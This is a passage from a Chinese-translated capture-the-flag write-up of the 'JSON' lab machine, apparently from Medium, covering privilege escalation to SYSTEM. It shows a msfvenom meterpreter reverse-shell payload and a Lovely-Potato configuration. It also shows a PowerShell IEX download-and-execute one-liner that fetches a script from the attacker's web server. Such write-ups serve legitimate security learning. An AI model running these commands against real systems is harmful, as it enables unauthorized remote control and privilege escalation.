b">Lovely-Potato</code>。让我们用这个来得到我们性感的系统外壳。我们只需要创建另一个msfvenom反向shell有效负载，并将其托管在我们自己的web服务器上。然后，我们只需要在目标框上运行<code class="fe kz la lb lc b">Invoke-LovelyPotato.ps1</code>。让我们开始吧。</p><h2 id="5e3e" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">攻击者箱</h2><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="adcc" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### Creating Msfvenom Payload</strong><br/>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.29 LPORT=444 -f exe -o meterpreter.exe</span><span id="3d6a" class="mn lq it lc b gy ou nj l nk nl"><br/><strong class="lc iu">### Modify "Invoke-LovelyPotato.ps1" Configuration Section</strong><br/># Configuration<br/>$RemoteDir = 'http://10.10.14.29:8000'    <strong class="lc iu"> # Attacker box web server</strong><br/>$LocalPath = 'C:\Temp'          <strong class="lc iu"> # Writable folder on the target box</strong></span><span id="76f2" class="mn lq it lc b gy ou nj l nk nl"><strong class="lc iu">### Running Multi/handler</strong></span></pre><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pi"><img src="../Images/beee9ca4ad63071a262d0a03b31dd222.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JAuu8wEX87-BJNd0E6OW5w.png"/></div></div></figure><h2 id="d238" class="mn lq it bd lr mo mp dn lv mq mr dp lz km ms mt md kq mu mv mh ku mw mx ml my bi translated">目标框</h2><p id="1ab7" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">在当前的<code class="fe kz la lb lc b">meterpreter</code>会话中，我们可以简单地运行下面的PowerShell命令。</p><pre class="ll lm ln lo gt ne lc nf ng aw nh bi"><span id="e11f" class="mn lq it lc b gy ni nj l nk nl"><strong class="lc iu">### PowerShell Lovely-Potato</strong><br/>powershell.exe -nop "IEX(New-Object Net.WebClient).DownloadString('<a class="ae oe" href="http://10.10.14.29:8000/Invoke-LovelyPotato.ps1'" rel="noopener ugc nofollow" target="_blank">http://10.10.14.29:8000/Invoke-LovelyPotato.ps1'</a>)"</span></pre><p id="86c3" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">一旦我们运行该命令，我们将看到从我们的web服务器中提取的文件。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pj"><img src="../Images/868b443a60a202192338587f97ea7873.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QBXexoqvtHGdvDv-LDwt_Q.png"/></div></div></figure><p id="d438" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">大约5到10分钟后，我们将在JSON框中得到以下输出。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pk"><img src="../Images/d16fc5e3eaf4c5dedc035f2649fb6153.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wnhwsULiBCD2aPI0VOGtyQ.png"/></div></div></figure><p id="f8fb" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">在我们的<code class="fe kz la lb lc b">multi/handler</code>上，我们成功接收了一个高架系统外壳。:)</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pl"><img src="../Images/598ebec983500e3590afe351f0e71e24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-tYM1_ncKaXTrdy0vYDrhg.png"/></div></div></figure><p id="1695" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">有了这个访问权限，我们就可以继续读取<code class="fe kz la lb lc b">root.txt</code>文件了。</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div class="gh gi pm"><img src="../Images/b333ba079280b014fb1a6eb4c020b88c.png" data-original-src="https://miro.medium.com/v2/resize:fit:714/format:webp/1*PjsRWMNsIO2zZLE-Qt5aoQ.png"/></div></figure><h1 id="9f54" class="lp lq it bd lr ls lt lu lv lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm bi translated">结论</h1><p id="f53e" class="pw-post-body-paragraph kb kc it kd b ke mz kg kh ki na kk kl km nb ko kp kq nc ks kt ku nd kw kx ky im bi translated">这是一个很好的中等难度的盒子，有一些有趣的攻击媒介。老实说，我真的很喜欢滥用JSON反序列化来在机器上执行代码。对于根，这是一个有点直截了当的特权升级，但我听说还有两(2)个其他升级路径被其他玩家发现。我可能会在这里覆盖/添加它们，以便将来更新文章。:)</p><p id="0b39" class="pw-post-body-paragraph kb kc it kd b ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky im bi translated">感谢阅读！</p><figure class="ll lm ln lo gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="jv jw di jx bf jy"><div class="gh gi pn"><img src="../Images/5f9d67c1d5ee72ae69e3e36d4786d73d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*djpFwqNmGPnEHOQN6fxeMg.png"/></div></div></figure></div></div>    
</body>
</html>